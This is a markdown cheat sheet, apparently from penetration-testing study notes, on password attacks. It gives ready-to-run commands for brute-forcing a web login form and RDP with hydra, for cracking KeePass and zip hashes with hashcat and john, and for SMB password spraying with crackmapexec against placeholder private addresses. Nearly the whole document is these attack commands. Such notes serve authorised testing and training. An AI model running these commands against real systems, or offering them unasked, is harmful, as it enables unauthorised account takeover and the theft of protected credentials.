# 05 - Password Cracking

Index
- [First Rule!](#First-Rule)
- [Form Login](#Form-Login)
- [RDP](#RDP)
- [KeePass DB](#KeePass-DB)
- [Zip](#Zip)

## First Rule
Always try the default credentials!

## Form Login
``` bash
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.1 -s 443 http-post-form "/login.php:LOGIN=^LOGIN^&password=^PASS^:Login failed"
         # user file # password file                  # target           # method                   # user field                  # error msg
```

## RDP
``` bash
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.1
```

## KeePass DB
``` bash
keepass2john Database.kdbx > keepass.hash                                                               ## extract the hash (*)
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule  ## cracking
```
(*) The hash file was generated with the string "Database:", delete it.

## Zip
``` bash
zip2john file.zip > file.hash                               ## hash extraction
john file.hash --wordlist=/usr/share/wordlists/rockyou.txt  ## cracking
```

## SMB password spraying
``` bash
crackmapexec smb 192.168.1.1 -d domain.local -u user.txt -p passwd.txt
```